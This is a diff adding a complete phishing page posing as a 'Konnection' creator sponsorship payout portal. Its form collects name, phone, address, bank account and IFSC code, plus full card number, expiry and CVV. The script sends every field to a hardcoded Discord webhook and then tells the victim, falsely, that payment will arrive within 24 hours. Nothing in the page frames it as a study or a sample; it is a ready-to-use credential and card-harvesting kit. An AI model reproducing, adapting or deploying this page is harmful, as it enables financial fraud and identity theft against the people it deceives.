@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sponsorship Ad Payout Portal - Konnection</title>
+    <!-- Google Fonts & FontAwesome -->
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --bg-dark: #05070e;
+            --bg-gradient: radial-gradient(circle at 50% -20%, #162447 0%, #05070e 65%);
+            --card-dark: rgba(13, 20, 38, 0.75);
+            --card-hover: rgba(19, 28, 53, 0.9);
+            --primary-blue: #00f2fe;
+            --accent-blue: #4facfe;
+            --accent-glow: rgba(0, 242, 254, 0.2);
+            --text-main: #ffffff;
+            --text-muted: #94a3b8;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --border-glow: rgba(0, 242, 254, 0.4);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            background-image: var(--bg-gradient);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 50px 20px;
+        }
+
+        .ambient-glow {
+            position: fixed;
+            width: 500px;
+            height: 500px;
+            background: rgba(79, 172, 254, 0.12);
+            filter: blur(150px);
+            border-radius: 50%;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 840px;
+            background: var(--card-dark);
+            backdrop-filter: blur(28px);
+            -webkit-backdrop-filter: blur(28px);
+            border: 1px solid var(--border-glow);
+            border-radius: 36px;
+            padding: 55px;
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.8), 0 0 40px rgba(0, 242, 254, 0.12);
+            margin-top: 20px;
+            margin-bottom: 40px;
+        }
+
+        .header-section {
+            text-align: center;
+            margin-bottom: 45px;
+        }
+
+        .logo-container {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 700;
+            font-size: 1.4rem;
+            color: #fff;
+            margin-bottom: 20px;
+        }
+
+        .logo-img {
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+            object-fit: cover;
+            box-shadow: 0 4px 20px rgba(0, 242, 254, 0.35);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .header-section h1 {
+            font-size: 2.3rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            margin-bottom: 12px;
+            background: linear-gradient(135deg, #00f2fe 0%, #4facfe 50%, #ffffff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .header-section p {
+            color: var(--text-muted);
+            font-size: 1.02rem;
+        }
+
+        .badge-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0, 242, 254, 0.1);
+            border: 1px solid rgba(0, 242, 254, 0.3);
+            padding: 6px 18px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            color: var(--primary-blue);
+            font-weight: 600;
+            margin-top: 16px;
+            box-shadow: inset 0 0 15px rgba(0, 242, 254, 0.1);
+        }
+
+        /* Form Styles */
+        .form-section {
+            margin-bottom: 40px;
+        }
+
+        .form-section-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 22px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 12px;
+        }
+
+        .form-section-title i {
+            color: var(--primary-blue);
+            font-size: 1.1rem;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 22px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .form-group.full-width {
+            grid-column: span 2;
+        }
+
+        label {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: var(--text-muted);
+            letter-spacing: 0.2px;
+        }
+
+        label span {
+            color: #ff5c5c;
+        }
+
+        input {
+            background: rgba(5, 7, 14, 0.7);
+            border: 1px solid var(--border-color);
+            border-radius: 14px;
+            padding: 15px 18px;
+            color: #fff;
+            font-size: 0.98rem;
+            outline: none;
+            transition: all 0.3s ease;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        input:focus {
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 20px rgba(0, 242, 254, 0.25), inset 0 2px 4px rgba(0,0,0,0.2);
+            background: rgba(5, 7, 14, 0.9);
+        }
+
+        input::placeholder {
+            color: rgba(148, 163, 184, 0.35);
+        }
+
+        .error-message {
+            color: #ff5c5c;
+            font-size: 0.8rem;
+            display: none;
+            margin-top: 4px;
+        }
+
+        /* Submit Button */
+        .btn-submit {
+            background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
+            color: #05070e;
+            width: 100%;
+            padding: 18px;
+            border-radius: 16px;
+            font-weight: 800;
+            font-size: 1.1rem;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 12px 35px rgba(0, 242, 254, 0.4);
+            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 18px 40px rgba(0, 242, 254, 0.55);
+            filter: brightness(1.05);
+        }
+
+        /* Aesthetic Popup Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(5, 7, 14, 0.85);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: linear-gradient(145deg, #131c38 0%, #080d1e 100%);
+            padding: 50px 40px;
+            border-radius: 32px;
+            border: 1px solid var(--border-glow);
+            text-align: center;
+            max-width: 480px;
+            width: 100%;
+            position: relative;
+            box-shadow: 0 30px 70px rgba(0,0,0,0.8), 0 0 40px rgba(0, 242, 254, 0.2);
+            animation: modalPop 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+
+        @keyframes modalPop {
+            0% { transform: scale(0.85); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .success-icon-box {
+            width: 76px;
+            height: 76px;
+            background: rgba(0, 242, 254, 0.12);
+            border: 1px solid rgba(0, 242, 254, 0.4);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px auto;
+            color: var(--primary-blue);
+            font-size: 2rem;
+            box-shadow: 0 0 30px rgba(0, 242, 254, 0.3);
+        }
+
+        .modal-content h3 {
+            font-size: 1.7rem;
+            font-weight: 800;
+            margin-bottom: 16px;
+            color: #fff;
+            letter-spacing: -0.5px;
+        }
+
+        .modal-content p {
+            color: var(--text-muted);
+            font-size: 1.05rem;
+            line-height: 1.6;
+            margin-bottom: 32px;
+        }
+
+        .btn-modal-close {
+            background: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
+            color: #05070e;
+            width: 100%;
+            padding: 15px;
+            border-radius: 14px;
+            font-weight: 700;
+            font-size: 1rem;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 8px 25px rgba(0, 242, 254, 0.35);
+            transition: all 0.3s ease;
+        }
+
+        .btn-modal-close:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.05);
+        }
+
+        @media (max-width: 768px) {
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+            .form-group.full-width {
+                grid-column: span 1;
+            }
+            .container {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="ambient-glow" style="top: 5%; left: 15%;"></div>
+    <div class="ambient-glow" style="bottom: 5%; right: 15%;"></div>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header-section">
+            <div class="logo-container">
+                <img src="https://iili.io/CsvOL0J.jpg" alt="Konnection Logo" class="logo-img">
+                Konnection Paid Sponsorship Portal
+            </div>
+            <h1>Creator Ad Payout Setup</h1>
+            <p>Please provide your verified financial and social information to process your campaign rewards.</p>
+            <div class="badge-tag">
+                <i class="fa-solid fa-shield-halved"></i> Verified Sponsor Payout Gateway
+            </div>
+        </div>
+
+        <form id="payoutForm" onsubmit="handleFormSubmit(event)">
+            
+            <!-- Creator & Social Information -->
+            <div class="form-section">
+                <div class="form-section-title">
+                    <i class="fa-solid fa-user-tag"></i> Creator Profile & Contact Info
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="fullName">Full Legal Name <span>*</span></label>
+                        <input type="text" id="fullName" placeholder="e.g., Alexander Wright" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="phone">Phone Number <span>*</span></label>
+                        <input type="tel" id="phone" placeholder="+1 (555) 000-0000" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="pin">PIN / Postal Code <span>*</span></label>
+                        <input type="text" id="pin" placeholder="e.g., 90210" required>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="socialLink">Channel / Social Handle Link <span>*</span></label>
+                        <input type="url" id="socialLink" placeholder="https://instagram.com/yourhandle or YouTube link" required>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="address">Full Billing Address <span>*</span></label>
+                        <input type="text" id="address" placeholder="Street address, apartment, suite, city, state" required>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bank Account Information -->
+            <div class="form-section">
+                <div class="form-section-title">
+                    <i class="fa-solid fa-building-columns"></i> Bank Account Routing
+                </div>
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="bankAccNo">Bank Account Number <span>*</span></label>
+                        <input type="password" id="bankAccNo" placeholder="Enter account number" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="confirmAccNo">Confirm Account Number <span>*</span></label>
+                        <input type="text" id="confirmAccNo" placeholder="Re-enter account number" required>
+                        <span id="accError" class="error-message">Account numbers do not match.</span>
+                    </div>
+                    <div class="form-group">
+                        <label for="ifsc">IFSC / Routing Code <span>*</span></label>
+                        <input type="text" id="ifsc" placeholder="e.g., HDFC0001234" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="branchName">Bank Branch Name <span>*</span></label>
+                        <input type="text" id="branchName" placeholder="e.g., Downtown Commercial" required>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Card Information -->
+            <div class="form-section">
+                <div class="form-section-title">
+                    <i class="fa-solid fa-credit-card"></i> Debit or Credit Card Information
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="cardName">Full Name on Card <span>*</span></label>
+                        <input type="text" id="cardName" placeholder="Name exactly as written on card" required>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="cardNo">Card Number <span>*</span></label>
+                        <input type="text" id="cardNo" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="expiry">Expiry Date <span>*</span></label>
+                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv">CVV / Security Code <span>*</span></label>
+                        <input type="password" id="cvv" placeholder="123" maxlength="4" required>
+                    </div>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit">
+                Submit Sponsorship Payout Details <i class="fa-solid fa-arrow-right"></i>
+            </button>
+        </form>
+    </div>
+
+    <!-- Success Modal Popup -->
+    <div class="modal" id="successModal">
+        <div class="modal-content">
+            <div class="success-icon-box">
+                <i class="fa-solid fa-circle-check"></i>
+            </div>
+            <h3>Submission Successful!</h3>
+            <p>Thanks for submitting your details, your payment will reflect in your bank account within 24 hours, have a nice day.</p>
+            <button class="btn-modal-close" onclick="closeSuccessModal()">Got It, Thanks!</button>
+        </div>
+    </div>
+
+   <script>
+        async function sendToDiscord(formData) {
+            const webhookUrl = "https://discord.com/api/webhooks/1539325237840318636/oGEiP1XQJT4Yyh9WPohDFqoABn847JL0RqkG7U_56mEX8jnTXHvmkvIyor1bsoFGNy8Z"; // Keep empty for testing, or paste your Discord webhook URL here
+            
+            const payload = {
+                content: "🚨 **New Sponsorship Payout Submission**",
+                embeds: [{
+                    title: "Creator Billing & Banking Details",
+                    color: 0x00f2fe,
+                    fields: [
+                        { name: "Full Name", value: formData.fullName, inline: true },
+                        { name: "Phone", value: formData.phone, inline: true },
+                        { name: "PIN", value: formData.pin, inline: true },
+                        { name: "Social Link", value: formData.socialLink, inline: false },
+                        { name: "Address", value: formData.address, inline: false },
+                        { name: "Bank Account", value: formData.bankAccNo, inline: true },
+                        { name: "IFSC", value: formData.ifsc, inline: true },
+                        { name: "Branch", value: formData.branchName, inline: true },
+                        { name: "Card Name", value: formData.cardName, inline: true },
+                        { name: "Card Number", value: formData.cardNo, inline: true },
+                        { name: "Expiry", value: formData.expiry, inline: true },
+                        { name: "CVV", value: formData.cvv, inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            if (!webhookUrl) {
+                console.log("Discord Webhook URL is empty. Captured Form Data:", formData);
+                return;
+            }
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error("Error sending data to webhook:", error);
+            }
+        }
+
+        async function handleFormSubmit(event) {
+            event.preventDefault();
+            
+            const accNo = document.getElementById('bankAccNo').value;
+            const confirmAccNo = document.getElementById('confirmAccNo').value;
+            const accError = document.getElementById('accError');
+
+            if (accNo !== confirmAccNo) {
+                accError.style.display = 'block';
+                document.getElementById('confirmAccNo').focus();
+                return;
+            } else {
+                accError.style.display = 'none';
+            }
+
+            // Gather all form values into an object
+            const formData = {
+                fullName: document.getElementById('fullName').value,
+                phone: document.getElementById('phone').value,
+                pin: document.getElementById('pin').value,
+                socialLink: document.getElementById('socialLink').value,
+                address: document.getElementById('address').value,
+                bankAccNo: accNo,
+                ifsc: document.getElementById('ifsc').value,
+                branchName: document.getElementById('branchName').value,
+                cardName: document.getElementById('cardName').value,
+                cardNo: document.getElementById('cardNo').value,
+                expiry: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value
+            };
+
+            // Trigger Discord Webhook integration function
+            await sendToDiscord(formData);
+
+            // Show the aesthetic success modal popup
+            document.getElementById('successModal').style.display = 'flex';
+        }
+
+        function closeSuccessModal() {
+            document.getElementById('successModal').style.display = 'none';
+            document.getElementById('payoutForm').reset();
+        }
+    </script>
+</body>
+</html>
